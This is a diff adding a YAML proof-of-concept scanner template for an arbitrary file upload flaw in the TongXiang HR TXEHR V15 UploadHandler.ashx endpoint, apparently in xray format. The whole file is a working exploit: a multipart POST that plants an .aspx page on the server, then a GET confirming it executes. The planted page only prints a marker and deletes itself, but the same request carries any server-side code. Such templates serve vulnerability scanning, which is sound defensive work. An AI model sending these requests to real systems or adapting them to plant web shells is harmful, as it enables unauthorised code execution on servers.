@@ -1,0 +1,39 @@
+name: poc-yaml-tongxiangHR-TXEHR_V15_UploadHandler-File-upload
+transport: http
+
+
+set:
+  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
+  rboundary: randomLowercase(8)
+  username: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Handler/UploadHandler.ashx?folder=Uploadfile2
+      headers:
+        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351{{rboundary}}
+      body: "-----------------------------142851345723692939351{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"Filedata\"; filename=\"{{username}}.aspx\"\"\r\n\
+        Content-Type: text/plain\r\n\
+        \r\n\
+        <%@ Page Language=\"C#\" %><% Response.Write(\"{{randbody}}\"); System.IO.File.Delete(Request.PhysicalPath); %>\r\n\
+        -----------------------------142851345723692939351{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+
+
+  r1:
+    request:
+      method: GET
+      path: /Handler/Uploadfile2/{{username}}.aspx
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140985569
